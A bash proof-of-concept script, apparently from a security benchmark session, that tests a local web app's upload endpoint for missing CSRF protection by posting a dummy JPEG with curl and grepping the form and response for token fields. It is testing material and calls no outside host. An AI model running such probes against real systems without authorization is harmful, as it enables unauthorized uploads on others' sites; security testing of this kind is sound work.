#!/bin/bash
# POC: Demonstrates CSRF vulnerability in file upload functionality by performing unauthorized file upload without CSRF token validation
# Target: ./repo
# Created: 2025-11-07T19:29:03.480Z
# Session: benchmark-XBEN-067-24-mhp8bhdm

# CSRF File Upload POC - Demonstrates missing CSRF token protection
# This script shows that file uploads can be performed without any CSRF token
# validation, allowing attackers to upload files on behalf of authenticated users

TARGET_URL="${1:-http://localhost:8080}"
UPLOAD_ENDPOINT="${TARGET_URL}/"

echo "[*] CSRF File Upload Vulnerability POC"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Create a test file to upload (simple image)
TEST_FILE="/tmp/csrf_test_$(date +%s).jpg"
# Create a minimal valid JPEG file (JPEG magic bytes: FF D8 FF E0)
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > "${TEST_FILE}"
echo "test data" >> "${TEST_FILE}"

echo "[*] Created test file: ${TEST_FILE}"
echo ""

# Test 1: Upload without any CSRF token (should succeed if vulnerable)
echo "[TEST 1] Uploading file without CSRF token..."
RESPONSE=$(curl -s -w "\n%{http_code}" -F "userfile=@${TEST_FILE}" -F "submit=Upload Image" "${UPLOAD_ENDPOINT}")
HTTP_CODE=$(echo "${RESPONSE}" | tail -n1)
BODY=$(echo "${RESPONSE}" | sed '$d')

echo "[*] HTTP Response Code: ${HTTP_CODE}"
echo ""

if [ "${HTTP_CODE}" = "200" ]; then
    echo "[+] VULNERABLE: File upload succeeded without CSRF token validation"
    echo "[+] Server accepted upload request without any CSRF protection"
    echo ""
    echo "[*] Response body (first 500 chars):"
    echo "${BODY}" | head -c 500
    echo ""
    echo ""
    VULNERABLE=1
else
    echo "[-] Upload failed with HTTP ${HTTP_CODE}"
    echo "[*] Server may have CSRF protection in place"
    VULNERABLE=0
fi

# Test 2: Verify no CSRF token is present in the form
echo ""
echo "[TEST 2] Checking if upload form contains CSRF token protection..."
FORM_RESPONSE=$(curl -s "${UPLOAD_ENDPOINT}")

if echo "${FORM_RESPONSE}" | grep -qiE "(csrf|token|nonce)"; then
    echo "[!] Form might contain CSRF token field"
    echo "[*] Checking for common token patterns..."
    echo "${FORM_RESPONSE}" | grep -iE "(csrf|token|nonce)" | head -3
else
    echo "[+] VULNERABLE: No CSRF token, nonce, or token field found in form"
fi

# Test 3: Check response for error about missing CSRF token
echo ""
echo "[TEST 3] Checking if server validates CSRF tokens..."
if echo "${BODY}" | grep -qiE "(csrf|token|invalid|missing|protection)"; then
    echo "[!] Response contains CSRF-related message"
    echo "[*] Server may validate CSRF tokens"
else
    echo "[+] VULNERABLE: No CSRF validation error detected"
    echo "[+] Server processed upload without token validation"
fi

echo ""
echo "[*] Cleanup: Removing test file ${TEST_FILE}"
rm -f "${TEST_FILE}"

echo ""
if [ "${VULNERABLE}" = "1" ]; then
    echo "[+] CONCLUSION: Application is vulnerable to CSRF attacks on file upload"
    exit 0
else
    echo "[-] Could not confirm vulnerability"
    exit 1
fi